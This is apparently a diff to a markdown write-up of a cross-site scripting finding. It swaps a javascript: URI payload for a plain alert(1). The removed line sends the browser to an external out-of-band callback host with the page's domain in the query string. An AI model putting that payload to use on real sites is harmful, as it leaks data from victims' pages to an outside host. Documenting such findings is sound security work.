@@ -19,10 +19,6 @@ ___
 
 
 ```js
-javascript:alert(document.location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain)
+javascript:alert(1)
 ```
 
-
-```
-
-```
